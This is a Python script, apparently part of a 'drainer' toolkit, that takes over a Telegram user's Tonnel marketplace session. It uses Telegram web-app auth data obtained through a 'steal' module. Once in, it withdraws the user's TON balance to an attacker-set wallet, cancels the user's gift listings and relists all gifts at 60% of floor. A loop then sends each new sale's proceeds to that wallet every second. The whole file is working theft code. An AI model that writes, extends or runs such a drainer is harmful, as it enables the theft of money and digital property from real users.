import argparse
import asyncio
import json
import os
import sys
import time

import paths

import config_migration

config_migration.ensure_team_config_migrated(
    os.path.join(paths.get_team_dir(), "config.py")
)

import config

from drainer.core import hybr1d_shared
from drainer.core.steal import get_tg_webappdata
from drainer.core.tonnel_api import (
    coffin_balance_withdraw,
    coffin_cancel_sale,
    coffin_list_for_sale,
    fetch_managed_gifts,
    get_balance_info,
    gift_floor,
)

WALLET = os.environ.get("WITHDRAW_WALLET", "")
MIN_LIST_TON = 0.01
FLOOR_KEEP_MULT = 1.0 - 0.4
ASSET = "TON"
WITHDRAW_EPS = 1e-9


def _price_str(x: float) -> str:
    x = max(x, MIN_LIST_TON)
    s = f"{x:.8f}".rstrip("0").rstrip(".")
    return s if s else str(MIN_LIST_TON)


def _floor_ok(r: object) -> bool:
    return (
        isinstance(r, dict)
        and r.get("status") == "success"
        and isinstance(r.get("floor"), (int, float))
    )


def _page_lists(init_data: str) -> tuple[list, list]:
    out = fetch_managed_gifts(init_data, page=1)
    pg = out.get("pageGifts") or {}
    return (pg.get("listed_for_sale") or [], pg.get("owned_not_listed") or [])


async def _init_data(fresh: bool) -> str:
    env = (os.environ.get("TONNEL_INIT_DATA") or "").strip()
    if env:
        return env
    if not fresh:
        cached = hybr1d_shared.read_cached_init_data()
        if cached:
            return cached
    async with hybr1d_shared.hybr1d_client_context(
        config.API_ID, config.API_HASH, config.HYBR1D_SESSION_STRING
    ) as app:
        return await get_tg_webappdata(app, "@Tonnel_Network_bot")


async def _withdraw(wallet: str, init_data: str, amount: float) -> object:
    if amount <= WITHDRAW_EPS:
        return "skip_zero"
    return await asyncio.to_thread(
        coffin_balance_withdraw,
        wallet,
        init_data,
        float(amount),
        ASSET,
    )


async def _run(fresh: bool) -> None:
    init_data = await _init_data(fresh)
    bal0 = float(get_balance_info(init_data))
    w0 = max(0.0, bal0 - 1.0)
    print(
        json.dumps(
            {"step": "withdraw_initial", "balance": bal0, "withdraw": w0},
            ensure_ascii=False,
        )
    )
    r0 = await _withdraw(WALLET, init_data, w0)
    print(
        json.dumps(
            {"step": "withdraw_initial_result", "result": r0},
            ensure_ascii=False,
            default=str,
        )
    )

    listed, _u = await asyncio.to_thread(_page_lists, init_data)
    for it in listed:
        if not isinstance(it, dict):
            continue
        gid = it.get("gift_id")
        if gid is None:
            continue
        cr = await asyncio.to_thread(coffin_cancel_sale, init_data, str(gid))
        print(
            json.dumps(
                {"step": "cancel", "gift_id": gid, "result": cr},
                ensure_ascii=False,
                default=str,
            )
        )
        await asyncio.sleep(0.05)

    listed2, unlisted2 = await asyncio.to_thread(_page_lists, init_data)
    by_id: dict[str, dict] = {}
    for it in listed2 + unlisted2:
        if not isinstance(it, dict):
            continue
        gid = it.get("gift_id")
        if gid is None:
            continue
        by_id[str(gid)] = it

    floor_cache: dict[str, object] = {}
    for gid_str in sorted(by_id.keys(), key=lambda x: int(x)):
        it = by_id[gid_str]
        name = (it.get("name") or "").strip()
        if not name:
            print(
                json.dumps(
                    {"step": "list_skip_no_name", "gift_id": gid_str},
                    ensure_ascii=False,
                )
            )
            continue
        if name not in floor_cache:
            floor_cache[name] = await asyncio.to_thread(gift_floor, init_data, name)
        fr = floor_cache[name]
        if not _floor_ok(fr):
            print(
                json.dumps(
                    {
                        "step": "list_skip_floor",
                        "gift_id": gid_str,
                        "name": name,
                        "floor_res": fr,
                    },
                    ensure_ascii=False,
                    default=str,
                )
            )
            continue
        fl = float(fr["floor"])
        target = max(MIN_LIST_TON, fl * FLOOR_KEEP_MULT)
        ps = _price_str(target)
        lr = await asyncio.to_thread(
            coffin_list_for_sale,
            init_data,
            gid_str,
            ps,
            ASSET,
        )
        print(
            json.dumps(
                {
                    "step": "list",
                    "gift_id": gid_str,
                    "name": name,
                    "floor": fl,
                    "price": ps,
                    "result": lr,
                },
                ensure_ascii=False,
                default=str,
            )
        )
        await asyncio.sleep(0.05)

    while True:
        await asyncio.sleep(1.0)
        b = float(get_balance_info(init_data))
        print(
            json.dumps(
                {"step": "tick", "balance": b, "ts": time.time()},
                ensure_ascii=False,
            )
        )
        if b > WITHDRAW_EPS:
            wr = await _withdraw(WALLET, init_data, b)
            print(
                json.dumps(
                    {"step": "withdraw_tick", "amount": b, "result": wr},
                    ensure_ascii=False,
                    default=str,
                )
            )


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("--fresh", action="store_true")
    args = ap.parse_args()
    try:
        asyncio.run(_run(args.fresh))
    except KeyboardInterrupt:
        sys.exit(130)


if __name__ == "__main__":
    main()
